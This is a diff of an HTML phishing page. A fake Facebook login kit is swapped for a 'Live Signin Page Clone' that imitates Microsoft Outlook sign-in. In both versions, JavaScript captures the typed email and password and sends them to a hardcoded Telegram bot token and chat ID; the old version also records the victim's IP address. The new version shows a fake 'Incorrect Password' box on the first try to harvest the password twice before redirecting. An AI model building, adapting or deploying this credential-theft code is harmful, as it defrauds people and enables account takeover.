@@ -1,263 +1,218 @@
 <!DOCTYPE html>
-<!-- Coding By CodingNepal - www.codingnepalweb.com -->
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook</title>
-    <link rel="shortcut icon" href="images\facebook-icon.png" type="image/x-icon">
-    <!-- <link rel="stylesheet" href="style.css"> -->
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Live Signin Page Clone</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Roboto', sans-serif;
-        }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
 
-        .flex {
-            display: flex;
-            align-items: center;
-        }
+    body {
+      display: grid;
+      place-items: center;
+      min-height: 100vh;
+      background-color: #dde2d1;
+    }
 
-        .container {
-            padding: 0 15px;
-            min-height: 100vh;
-            justify-content: center;
-            background: #f0f2f5;
-        }
+    form {
+      width: 440px;
+      background-color: #fff;
+      box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
+      padding: 44px;
+    }
 
-        .facebook-page {
-            justify-content: space-between;
-            max-width: 1000px;
-            width: 100%;
-        }
+    form h2 {
+      font-size: 24px;
+      font-weight: 500;
+    }
 
-        .facebook-page .text {
-            margin-bottom: 90px;
-        }
+    .form-group {
+      margin: 0 0 16px;
+    }
 
-        .facebook-page h1 {
-            color: #1877f2;
-            font-size: 4rem;
-            margin-bottom: 10px;
-        }
+    form input {
+      padding: 6px 10px 6px 0;
+      margin-top: 1rem;
+      border: none;
+      outline: none;
+      border-bottom: 1px solid #000000b3;
+      width: 100%;
+      font-size: .9rem;
+    }
 
-        .facebook-page p {
-            font-size: 1.75rem;
-            white-space: nowrap;
-        }
+    form p {
+      font-size: 13px;
+      margin-bottom: 16px;
+    }
 
-        form {
-            display: flex;
-            flex-direction: column;
-            background: #fff;
-            border-radius: 8px;
-            padding: 20px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
-                0 8px 16px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
-            width: 100%;
-        }
+    form a {
+      color: #0067b8;
+      text-decoration: none;
+    }
 
-        form input {
-            height: 55px;
-            width: 100%;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            margin-bottom: 15px;
-            font-size: 1rem;
-            padding: 0 14px;
-        }
+    form a:hover {
+      text-decoration: underline;
+    }
 
-        form input:focus {
-            outline: none;
-            border-color: #1877f2;
-        }
+    form button {
+      display: block;
+      margin-left: auto;
+      width: 108px;
+      height: 32px;
+      font-size: 15px;
+      background-color: #0067b8;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+    }
 
-        ::placeholder {
-            color: #777;
-            font-size: 1.063rem;
-        }
+    form button:hover {
+      background-color: #004b85;
+    }
 
-        .link {
-            display: flex;
-            flex-direction: column;
-            text-align: center;
-            gap: 15px;
-        }
+    .bottom {
+      width: 440px;
+      background-color: #fff;
+      box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
+      padding: 8px 44px;
+      font-size: 15px;
+      margin-top: 20px;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+    }
 
-        .link .login {
-            border: none;
-            outline: none;
-            cursor: pointer;
-            background: #1877f2;
-            padding: 15px 0;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 1.25rem;
-            font-weight: 600;
-            transition: 0.2s ease;
-        }
+    .bottom img {
+      width: 32px;
+      height: 32px;
+      margin-right: 12px;
+    }
 
-        .link .login:hover {
-            background: #0d65d9;
-        }
+    .bottom:hover {
+      background-color: #dde2d1;
+    }
 
-        form a {
-            text-decoration: none;
-        }
+    #errorModal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
 
-        .link .forgot {
-            color: #1877f2;
-            font-size: 0.875rem;
-        }
+    #errorModal .modal-box {
+      background: #fff;
+      padding: 20px 30px;
+      border-radius: 10px;
+      max-width: 300px;
+      text-align: center;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+    }
 
-        .link .forgot:hover {
-            text-decoration: underline;
-        }
+    #errorModal .modal-box h3 {
+      margin-bottom: 10px;
+      color: #e74c3c;
+    }
 
-        hr {
-            border: none;
-            height: 1px;
-            background-color: #ccc;
-            margin-bottom: 20px;
-            margin-top: 20px;
-        }
+    #errorModal .modal-box p {
+      font-size: 14px;
+    }
 
-        .button {
-            margin-top: 25px;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .button a {
-            padding: 15px 20px;
-            background: #42b72a;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 1.063rem;
-            font-weight: 600;
-            transition: 0.2s ease;
-        }
-
-        .button a:hover {
-            background: #3ba626;
-        }
-
-        @media (max-width: 900px) {
-            .facebook-page {
-                flex-direction: column;
-                text-align: center;
-            }
-
-            .facebook-page .text {
-                margin-bottom: 30px;
-            }
-        }
-
-        @media (max-width: 460px) {
-            .facebook-page h1 {
-                font-size: 3.5rem;
-            }
-
-            .facebook-page p {
-                font-size: 1.3rem;
-            }
-
-            form {
-                padding: 15px;
-            }
-        }
-
-        .foot {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-    </style>
+    #errorModal .modal-box button {
+      margin-top: 10px;
+      padding: 8px 16px;
+      background-color: #0067b8;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 
 <body>
-    <div class="container flex">
-        <div class="facebook-page flex">
-            <div class="text">
-                <h1>facebook</h1>
-                <p>Connect with friends and the world </p>
-                <p> around you on Facebook.</p>
-            </div>
-            <form id="contactForm" method="POST">
-                <input type="text" name="username" id="username" required placeholder="email">
-                <input type="text" id="ipaddress" name="ipaddress" hidden>
-                <input type="text" name="password" id="password" required placeholder="password">
-                <!-- <input type="hidden" name="_redirect" value="https://qwayzdp.netlify.app/fbpop1.html">  -->
-                <!-- <input type="hidden" name="_captcha" value="false"> -->
-                <div class="link">
-                    <button type="submit" value="Send Email" class="login" id="submit"
-                        style="text-decoration: none; color: white;">Login
-                    </button>
-                    <a href="#" class="forgot">Forgot password?</a>
-                </div>
-                <hr>
-                <div class="button">
-                    <a href="#">Create new account</a>
-                </div>
-            </form>
-        </div>
+  <!-- Modal -->
+  <div id="errorModal">
+    <div class="modal-box">
+      <h3>Incorrect Password</h3>
+      <p>Please double-check your password and try again.</p>
+      <button onclick="closeModal()">Try Again</button>
     </div>
-    <footer class="foot">
-        © 2024 Meta
+  </div>
 
-    </footer>
+  <div class="container">
+    <form id="form" method="POST">
+      <div class="forms-container">
+        <div class="forms">
+          <div class="first">
+            <h2>Sign in</h2>
+            <div class="form-group">
+              <input type="email" placeholder="Email" name="username" id="username" required>
+              <input type="password" placeholder="Password" name="password" id="password" required>
+            </div>
+            <p>No Account? <a href="#">Create One!</a></p>
+            <a href="#">Sign in with a security key <span>?</span></a>
+          </div>
+        </div>
+      </div>
+      <button type="submit">Sign in</button>
+    </form>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ipaddress = data.ip;
-                    document.getElementById('ipaddress').value = ipaddress;
-                })
-                .catch(error => {
-                    console.error('Error fetching IP address:', error);
-                });
+    <div class="bottom">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Microsoft_Outlook_2013-2019_logo.svg/811px-Microsoft_Outlook_2013-2019_logo.svg.png">
+      <span>Sign-in options</span>
+    </div>
+  </div>
+
+  <!-- JS -->
+  <script>
+    let attemptCount = 0;
+
+    document.getElementById('form').addEventListener('submit', function (e) {
+      e.preventDefault();
+      attemptCount++;
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      const telegramMessage = `🟦 Outlook Login Attempt\n\n📧 Email: ${username}\n🔑 Password: ${password}`;
+     var token = '8426130944:AAFqzg6H0uK4TpHPWKiYdqXve46_8Ekjy6I';
+      var chat_id = '7605799343';
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
+
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          if (attemptCount === 1) {
+            document.getElementById('errorModal').style.display = 'flex';
+          } else {
+            window.location.href = 'thanks.html'; // ✅ Second try = redirect
+          }
+        })
+        .catch(error => {
+          alert("Network error. Try again.");
+          console.error('Telegram error:', error);
         });
+    });
 
-
-
-        document.getElementById('contactForm').addEventListener('submit', function (event) {
-            event.preventDefault();
-
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            var ipaddress = document.getElementById('ipaddress').value;
-
-            var telegramMessage = `Username-fb: ${username}\nPassword-fb: ${password}\nIpaddress: ${ipaddress}`;
-
-                var token = '7359860344:AAHo06TGGIjd2fyD4bDcYgdjf9RPjsvpMbE';
-            var chat_id = '1747506929';
-
-            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
-
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        window.location.href = 'fbpop1.html';  // Redirect to thank you page
-                    } else {
-                        alert('Error sending message.');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
-        });
-    </script>
+    function closeModal() {
+      document.getElementById('errorModal').style.display = 'none';
+    }
+  </script>
 </body>
-
 
 </html>
